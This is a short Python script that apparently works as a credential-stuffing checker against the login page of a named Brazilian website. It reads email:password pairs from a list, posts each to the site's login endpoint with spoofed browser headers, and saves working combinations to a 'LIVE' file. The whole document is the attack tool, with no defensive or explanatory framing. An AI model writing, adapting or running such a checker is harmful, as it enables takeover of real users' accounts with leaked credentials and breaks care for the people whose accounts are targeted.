import requests
import sys
import os

try:
	db = sys.argv[1]
	dl = sys.argv[2]
except Exception:
	db = "db.txt"
	dl = ":"

	f = open(db, 'r').readlines()

	for i in range(len(f)):
		email = f[i].split()[0].split(dl)[0]
		senha = f[i].split()[0].split(dl)[1]

		url = 'https://www.inpower.com.br/login'
		headers = {
		'accept': 'application/json, text/javascript, */*; q=0.01',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://www.inpower.com.br',
		'referer': 'https://www.inpower.com.br/login',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
		'x-requested-with': 'XMLHttpRequest'
		}

		data = f'Login.Email={email}&Login.Password={senha}&Login.Submit='

		r = requests.post(url, headers=headers, data=data).text

		if 'IsValid":true' in r:
			print(f"Live {email}|{senha}")
			o = open("LIVE.txt", "a")
			o.write(f"Live {email}|{senha}\n")
		else:
			print(f"Die {email}|{senha}")